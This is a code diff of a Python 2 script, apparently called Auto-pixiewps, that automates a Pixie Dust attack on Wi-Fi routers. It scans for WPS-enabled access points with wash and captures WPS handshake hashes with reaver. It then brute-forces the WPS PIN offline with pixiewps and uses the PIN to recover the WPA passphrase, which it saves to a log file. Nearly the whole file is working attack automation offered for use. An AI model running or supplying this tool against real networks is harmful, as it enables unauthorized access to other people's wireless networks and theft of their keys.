@@ -6,203 +6,384 @@ import os
 import signal
 import re
 import sys
+hasLog=""
+channel=""
+bssid=""
+interface=""
+wlan=""
+clr="clear"
+def menu():
+	global clr
+	global interface
+	while True:
+		menuSelect=""
+		os.system(clr)
+		print"               ,-.----.                  "
+		print"   ,---,       \    /  \            .---."
+		print"  '  .' \      |   :    \          /. ./|"
+		print" /  ;    '.    |   |  .\ :     .--'.  ' ;"
+		print":  :       \   .   :  |: |    /__./ \ : |"
+		print":  |   /\   \  |   |   \ :.--'.  '   \\' ."
+		print"|  :  ' ;.   : |   : .   /___/ \ |    ' '"
+		print"|  |  ;/  \   \;   | |`-';   \  \;      :"
+		print"'  :  | \  \ ,'|   | ;    \   ;  `      |"
+		print"|  |  '  '--'  :   ' |     .   \    .\  ;"
+		print"|  :  :        :   : :      \   \   ' \ |"
+		print"|  | ,'","       |   | :       :   '  |----" 
+		print"`--''          `---'.|        \   \ ; ///NxXxU   "
+		print"                 `---`         '---"     
 
 
-def wash(f):
 
+		if hasLog == "Yes": print "           settings loaded.", interface
+		print
+		print "Menu:"
+		print "1: Manual input"
+		print "2: Wash scan"
+		print "3: start mon0 (setup in settings)"
+		print "4: settings"
+		print "5: Exit"
+		print
+		menuSelect = raw_input("Option:")
+
+		if menuSelect=="1":Manual()
+		elif menuSelect=="2":
+			if interface=="":interface = raw_input("interface:")
+			if interface=="0":menu()
+			Wash()
+		elif menuSelect=="3":Startmon()
+		elif menuSelect=="4":Settings()
+		elif menuSelect=="5":exit()
+		elif menuSelect.lower()=="debug":clr=""
+		elif menuSelect.lower()=="exit":exit()
+		elif menuSelect.lower()=="i know your secrets":print "well you better keep your mouth shut!"
+
+def Manual():
+	global interface
+	global channel
+	global bssid
+	global essid
+	essid="Not avail from manual attack."
+	os.system(clr)
+	if interface=="":interface = raw_input("interface:")
+	channel = raw_input("channel:")
+	if channel == "0":menu()
+	bssid = raw_input("bssid:")
+	if bssid=="0":menu()
+	reaver()
+
+
+def Wash():
 	global bssid
 	global channel
-	bssid=[]
-	channel=[]
-	essid=[]
-	pwr=[]
-	lock=[]
-	line="s"
-	spacer="- "
-	f.seek(0)
-	
-	while line:
-		line = f.readline()
-		if "[X]" in line:
-			print line
-			sys.exit("Monitor interface failed!")
-		if line[:5] != "BSSID":
-			if line[:5] != "-----":
-				essid.append (line[84:line.find("\n")])
-				bssid.append (line[:17])
-				channel.append (line[22:26])
-				pwr.append (line[37:41])
-				lock.append (line[64:69])
-	os.system('clear')
-	for x in range(0,len(bssid)-1):
-		if x == 0:print "Press CTRL+C to stop scan and choose accesspoint"
-		if x > 8:spacer="-"
-		if "Y" in lock[x]: print "\033[1;31;40m", x+1,spacer, "-b:",bssid[x], " -c:", channel[x], "Pwr", pwr[x], "-e:", essid[x]
-		if "N" in lock[x]: print "\033[1;32;40m", x+1,spacer, "-b:",bssid[x], " -c:", channel[x], "Pwr", pwr[x], "-e:", essid[x]
-
-
-
-print "\033[1;32;40m"
-os.system('clear')
-print "Auto-pixiewps /NxXxU"
-print
-print "1. Manual input"
-print "2. scan networks with Wash"
-manorauto = raw_input("Option:")
-interface = raw_input("Select interface (mon0 for example):")
-
-if manorauto == "2":
-	fWashOut = open("fWashOut.txt", "w")
-	fWashError = open("fWashError.txt", "w")
-	pidW = Popen(["wash", "-i", interface], stdout=fWashOut, stderr=fWashError).pid
-	f = open('fWashOut.txt')
+	global essid
+	if os.path.isfile("APW-Exclude") == True:
+		ex = open('APW-Exclude')
+		excludedBssid=ex.readlines()
+		ex.close()
+	else:excludedBssid=""
+	fWashOut = open("fWashOut", "w")
+	fWashError = open("fWashError", "w")
+	pidW = Popen(["wash", "-i", interface, "-C"], stdout=fWashOut, stderr=fWashError).pid
+	f = open('fWashOut')
+	load="-"
 	try:
 		while True:
-			wash(f)
-			time.sleep(0.2)
+			bssid=[]
+			channel=[]
+			essid=[]
+			pwr=[]
+			lock=[]
+			line=""
+			spacer="- "
+			f.seek(0)
+			line = "s"		
+			while line:
+				line = f.readline()
+				if "[X]" in line:
+					sys.exit("Monitor interface failed!")
+				if line[:5] != "BSSID":
+					if line[:5] != "-----":
+						essid.append (line[84:line.find("\n")])
+						bssid.append (line[:17])
+						channel.append (line[22:26])
+						pwr.append (line[37:41])
+						lock.append (line[64:69])
+			os.system(clr)
+			if len(bssid)==int(1):print "Scan started, No accesspoints with WPS detected yet.", load
+			for x in range(0,len(bssid)-1):
+				if x == 0:print "Press CTRL+C to stop scan and choose accesspoint"
+				if x > 8:spacer="-"
+				if any(bssid[x] in s for s in excludedBssid):continue
+				if "Y" in lock[x]: print "\033[1;31m", x+1,spacer, "-b:",bssid[x], " -c:", channel[x], "Pwr", pwr[x], "-e:", essid[x], "\033[0m\033[1;32m"
+				if "N" in lock[x]: print "\033[0m\033[1;32m", x+1,spacer, "-b:",bssid[x], " -c:", channel[x], "Pwr", pwr[x], "-e:", essid[x]
+			time.sleep(0.5)
+			if load=="|":load="/"
+			elif load=="/":load="-"
+			elif load=="-":load="\\"
+			elif load=="\\":load="|"
 	except KeyboardInterrupt:
-		print "\033[1;32;40m"
+		print 
+	os.kill(pidW, signal.SIGQUIT)
 	choose = raw_input("accesspoint:")
 	if choose == "0":
-		os.remove("fWashOut.txt")
-		os.remove("fWashError.txt")
-		sys.exit("Exit")
+		if os.path.isfile("fWashOut") == True:os.remove("fWashOut")
+		if os.path.isfile("fWashError") == True:os.remove("fWashError")
+		menu()
 	choose=int(choose)
 	bssid=bssid[choose-1]
 	channel=channel[choose-1]
 	channel.replace(" ", "")
+	essid=essid[choose-1]
 	f.close()
-	os.remove("fWashOut.txt")
-	os.remove("fWashError.txt")
+	if os.path.isfile("fWashOut") == True:os.remove("fWashOut")
+	if os.path.isfile("fWashError") == True:os.remove("fWashError")
+	reaver()
 
+def Startmon():
+	if wlan!="":
+		call(["airmon-ng", "start", wlan])
+	else:
+		print "Wlan card not specified in settings."
+		time.sleep(2)
 
-if manorauto == "1":
-	channel = raw_input("Channel:")
-	bssid = raw_input("BSSID:")
-
-WPSpin=""
-PKE=""
-EHash1=""
-EHash2=""
-AuthKey=""
-PKEb=""
-EHash1b=""
-EHash2b=""
-AuthKeyb=""
-
-
-
-fin = open("fReaverIn.txt", "w")
-fout = open("fReaverOut.txt", "w")
-ferr = open("fReaverErrors.txt", "w")
-
-pid = Popen(["reaver", "-i", interface, "-c", channel, "-b", bssid, "-vv", "-S"], stdin=fin, stdout=fout, stderr=ferr).pid
-
-print "Retrieving hashes!"
-f = open('fReaverOut.txt')
- 
-done="false"
-while done == "false":
-	line = f.readline()
-	if "Waiting for beacon" in line:print "Waiting for beacon"
-	if "Associated with" in line:print line[4:]
-	if "PKE:" in line and PKEb == "":
-		print "PKE hash found!"
-		PKEb="1"
-	if "AuthKey:" in line and AuthKeyb == "":
-		print "AuthKey hash found!"
-		AuthKeyb="1"
-	if "E-Hash1" in line and EHash1b == "":
-		print "E-Hash1 hash found!"
-		EHash1b="1"
-	if "E-Hash2" in line:
-		os.kill(pid, signal.SIGQUIT)
-		print "E-Hash2 found!"
-		done = "true"
-
-line="s"
-f.seek(0)
-while line:
-    
-    line = f.readline()
-    if "PKE:" in line:PKE=line
-    if "E-Hash1" in line:EHash1=line
-    if "E-Hash2" in line:EHash2=line
-    if "AuthKey" in line:AuthKey=line
-f.close()
-
-os.remove("fReaverErrors.txt")
-os.remove("fReaverIn.txt")
-os.remove("fReaverOut.txt")
-
-PKE=PKE[PKE.find("PKE:")+5:PKE.find("\n")]
-EHash1=EHash1[EHash1.find("EHash1:")+14:EHash1.find("\n")]
-EHash2=EHash2[EHash2.find("EHash2:")+14:EHash2.find("\n")]
-AuthKey=AuthKey[AuthKey.find("AuthKey:")+9:AuthKey.find("\n")]
-
-
-PKEb=len(re.sub('[^A-Za-z0-9]+', '', PKE))/2
-EHash1b=len(re.sub('[^A-Za-z0-9]+', '', EHash1))/2
-EHash2b=len(re.sub('[^A-Za-z0-9]+', '', EHash2))/2
-AuthKeyb=len(re.sub('[^A-Za-z0-9]+', '', AuthKey))/2
-print
-print "PKE:", PKEb, "bits"
-print "E-Hash1:", EHash1b, "bits"
-print "E-Hash2:", EHash2b, "bits"
-print "AuthKey:", AuthKeyb, "bits"
-if PKEb == 192 and EHash1b == 32 and EHash2b == 32 and AuthKeyb == 32:
+def Settings():
+	os.system(clr)
+	print "Settings."
 	print
-	print "Hashes seems to be right!"
-	print "using pixiewps to try and bruteforce the pin."
-else:
+	print "1: create new rules"
+	print "2: back"
 	print
-	print "Something fishy with the hashes."
-	print "using pixiewps to try and bruteforce the pin anyway."
+	settingChoose = raw_input("settings:")
+	if settingChoose=="1":
+		uwlan = raw_input("What physical wlan card to use? (ex. wlan0, wlan1):")
+		umon = raw_input("What mon is your default? (ex. mon0):")
+		qq = "Use %s as default mon, and do not ask for it later? <y/n>:" % (umon)
+		udmon = raw_input(qq)
+		ulog = raw_input("store PIN and WPA-keys in logfile? <y/n>:")
+		ulogfile = raw_input("Save logfile as (ex. log, log.txt):")
 
-fin2 = open("fPixiewpsIn.txt", "w")
-fout2 = open("fPixiewpsOut.txt", "w")
-ferr2 = open("fPixiewpsErrors.txt", "w")
+		saves=open("APW-Conf", "w")
+		saves.write("wlan:\n")
+		uwlan="%s\n" % (uwlan)
+		saves.write(uwlan)
+		saves.write("mon:\n")
+		umon="%s\n" % (umon)
+		saves.write(umon)
+		saves.write("UseDefMon:\n")
+		if udmon.lower()=="y":saves.write("Yes\n")
+		else:saves.write("No\n")
+		saves.write("UseLog:\n")
+		if ulog.lower()=="y":saves.write("Yes\n")
+		else:saves.write("No\n")
+		saves.write("LogName:\n")
+		saves.write(ulogfile)
+		saves.write("\n")
+		saves.close()
+		LoadSettings()
+def LoadSettings():
+	global hasLog
+	global interface
+	global logFile
+	global wlan
+	hasLog="Yes"
+	loadS = open('APW-Conf')
+	line = loadS.readline()
+	while line:
+		if line=="wlan:\n":
+			line = loadS.readline()
+			wlan=line[:line.find("\n")]
+		if line=="mon:\n":
+			line = loadS.readline()
+			interface=line[:line.find("\n")]
+		if line=="UseDefMon:\n":
+			line=loadS.readline()
+			useDm=line[:line.find("\n")]
+		if line=="UseLog:\n":
+			line = loadS.readline()
+			usel=line[:line.find("\n")]
+		if line=="LogName:\n":
+			line = loadS.readline()
+			logFile=line[:line.find("\n")]
 
+		line = loadS.readline()
+	if useDm=="No":interface=""
+	if usel=="No":lofFile=""
 
-runpixie=Popen(["pixiewps", "-e", PKE, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-S"],stdin=fin2, stdout=fout2, stderr=ferr2)
-Popen.wait(runpixie)
-
-f = open('fPixiewpsOut.txt')
-line="s"
-while line:
-	line = f.readline()
-	if "WPS pin:" in line:WPSpin=line
-	if "WPS pin not found!" in line:WPSpin="WPS pin not found!"
-f.close()
-
-
-os.remove("fPixiewpsErrors.txt")
-os.remove("fPixiewpsIn.txt")
-os.remove("fPixiewpsOut.txt")
-
-if WPSpin=="WPS pin not found!":
-	print
-	print WPSpin
-else:
-	WPSpin=WPSpin[WPSpin.find("WPS pin")+9:WPSpin.find("\n")]
-	print
-	print "WPS pin found!"
-	print "Wps pin:", WPSpin
-	print
-	print
-	useReaver = raw_input("Run this pin trough reaver on the Accesspoint? (y/N):")
-	if useReaver=="y" or useReaver=="Y":
-		WPSpin="--pin=%s" % (WPSpin)
-		call(["reaver", "-i", interface, "-c", channel, "-b", bssid, "-vv", "-S", WPSpin])
+def reaver():
+	global PKE
+	global PKEb
+	global AuthKey
+	global AuthKeyb
+	global EHash1
+	global EHash1b
+	global EHash2
+	global EHash2b
+	global doing
+	global Cline
+	global bssid
+	global WPAkey
+	global WPSpin
+	WPAkey=""
+	WPApin=""
+	Cline=[]
+	WPSpin=""
+	PKE=""
+	EHash1=""
+	EHash2=""
+	AuthKey=""
+	PKEb=""
+	EHash1b=""
+	EHash2b=""
+	AuthKeyb=""
+	hashing=""
+	doing="Retrieving hashes!"
+	delsession="%s%s%s" % ("/usr/local/etc/reaver/", re.sub('[^A-Za-z0-9.]+', '', bssid), ".wpc")
+	if os.path.isfile(delsession):os.remove(delsession)
+	fout = open("fReaverOut", "w")
+	ferr = open("fReaverErrors", "w")
+	pid = Popen(["reaver", "-i", interface, "-c", channel, "-b", bssid, "-vv", "-S"], stdout=fout, stderr=ferr).pid
+	f = open("fReaverOut")
+	try:
+		while True:
+			line = f.readline()
+			while line:
+				if "PKE:" in line and PKEb == "":
+					PKE=line[line.find("PKE:")+5:line.find("\n")]
+					PKEb=len(re.sub('[^A-Za-z0-9]+', '', PKE))/2,
+				if "AuthKey:" in line and AuthKeyb == "":
+					AuthKey=line[line.find("AuthKey:")+9:line.find("\n")]
+					AuthKeyb=len(re.sub('[^A-Za-z0-9]+', '', AuthKey))/2,
+				if "E-Hash1" in line and EHash1b == "":
+					EHash1=line[line.find("E-Hash1:")+9:line.find("\n")]
+					EHash1b=len(re.sub('[^A-Za-z0-9]+', '', EHash1))/2,
+				if "E-Hash2" in line and EHash2b == "":
+					EHash2=line[line.find("E-Hash2:")+9:line.find("\n")]
+					EHash2b=len(re.sub('[^A-Za-z0-9]+', '', EHash2))/2,
+				if PKE!="" and AuthKey!="" and EHash1!="" and EHash2!="":hashing="done"
+				Cline.append (line)
+				line = f.readline()
+			if not line:status()
+			if hashing=="done":
+				os.kill(pid, signal.SIGQUIT)
+				f.close()
+				if os.path.isfile("fReaverOut") == True:os.remove("fReaverOut")
+				if os.path.isfile("fReaverErrors") == True:os.remove("fReaverErrors")
+				pixie()
+			time.sleep(0.1)
+	except KeyboardInterrupt:
 		print
-		print "^ hope it worked"
+		f.close()
+		if os.path.isfile("fReaverOut") == True:os.remove("fReaverOut")
+		if os.path.isfile("fReaverErrors") == True:os.remove("fReaverErrors")
+		menu()
 
-print
-print
-print
-print
+def convPin():
+	delsession="%s%s%s" % ("/usr/local/etc/reaver/", re.sub('[^A-Za-z0-9.]+', '', bssid), ".wpc")
+	if os.path.isfile(delsession):os.remove(delsession)
+	global WPAkey
+	global line
+	fout = open("fReaverOut", "w")
+	ferr = open("fReaverErrors", "w")
+	pin="--pin=%s" % (WPSpin)
+	pid = Popen(["reaver", "-i", interface, "-c", channel, "-b", bssid, "-vv", "-S", pin], stdout=fout, stderr=ferr).pid
+	f = open("fReaverOut")
+	try:
+		while True:
+			line = f.readline()
+			while line:
+				if "WPA PSK:" in line:break
+				line = f.readline()
+			if "WPA PSK:" in line:
+				WPAkey=line
+				break
+			if not line:status()
+			time.sleep(0.1)
+		WPAkey=WPAkey[WPAkey.find("'")+1:]
+		WPAkey=WPAkey[:WPAkey.find("'")]
+		status()
+		print "Cracked!"
+		select = raw_input("Would you like to exclude this router from future wash scans? <N/y>:")
+		if select.lower()=="y":
+			bsside="%s%s" % (bssid,"\n")
+			with open("APW-Exclude", "a") as myfile:myfile.write("%s\n") % (bsside)
+		if logFile!="":
+			with open(logFile, "a") as savelog:
+				saveinfo="essid:%s bssid:%s WPSpin:%s WPAkey:%s\n" % (essid, bssid, WPSpin, WPAkey)
+				savelog.write(saveinfo)
+		if os.path.isfile("fReaverOut") == True:os.remove("fReaverOut")
+		if os.path.isfile("fReaverErrors") == True:os.remove("fReaverErrors")
+		menu()
+	except KeyboardInterrupt:
+		os.kill(pid, signal.SIGQUIT)
+		f.close()
+		if os.path.isfile("fReaverOut") == True:os.remove("fReaverOut")
+		if os.path.isfile("fReaverErrors") == True:os.remove("fReaverErrors")
+		if logFile!="":
+			with open(logFile, "a") as savelog:
+				saveinfo="essid:%s bssid:%s WPSpin:%s WPAkey:reaver was aborted" % (essid, bssid, WPSpin)
+				savelog.write(saveinfo)
+		print
+		menu()
 
+def status():
+	os.system(clr)
+	print doing
+	print "bssid:%s" % (bssid)
+	print "essid:%s" % (essid)
+	print
+	print "PKE:%s" % (PKEb)
+	print "Authkey:%s" % (AuthKeyb)
+	print "E-Hash1:%s" % (EHash1b)
+	print "E-Hash2:%s" % (EHash2b)
+	print
+	if WPSpin:print "PIN:%s" % (WPSpin)
+	else:print "PIN:"
+	if WPAkey:print "WPA Key:%s" % (WPAkey)
+	else:print"WPA key"
+	print
+	print
+	if Cline:
+		line=Cline[len(Cline)-1]
+		print "\033[1;37;44m%s" % (line[:70]),"\033[0m\033[1;32m"
 
+def pixie():
+	global WPSpin
+	fout2 = open("fPixiewpsOut", "w")
+	ferr2 = open("fPixiewpsErrors", "w")
+	runpixie=Popen(["pixiewps", "-e", PKE, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-S"], stdout=fout2, stderr=ferr2)
+	Popen.wait(runpixie)
 
+	f = open("fPixiewpsOut")
+	line = f.readline()
+	while line:
+		if "WPS pin:" in line:WPSpin=line
+		elif "WPS pin not found!" in line:WPSpin="WPS pin not found!"
+		line = f.readline()
+	f.close()
+	os.remove("fPixiewpsErrors")
+	os.remove("fPixiewpsOut")
+	doing="Bruteforcing pin!"
+	status()
+	if WPSpin=="WPS pin not found!":
+		print
+		select = raw_input("Would you like to exclude this router from future wash scans? <N/y>:")
+		if select.lower()=="y":
+			bsside="%s%s" % (bsside,"\n")
+			with open("APW-Exclude", "a") as myfile:myfile.write("%s\n") % (bssid)
+	else:
+		WPSpin=WPSpin[WPSpin.find("WPS pin")+9:WPSpin.find("\n")]
+		convPin()
+	menu()
+def exit():
+	print"\033[0m"
+	#os.system(clr)
+	sys.exit("Autopixie has run its course.")
 
+if os.path.isfile("APW-Conf") == True:LoadSettings()
+print"\033[1;32m"
+
+menu()
+
+	
 
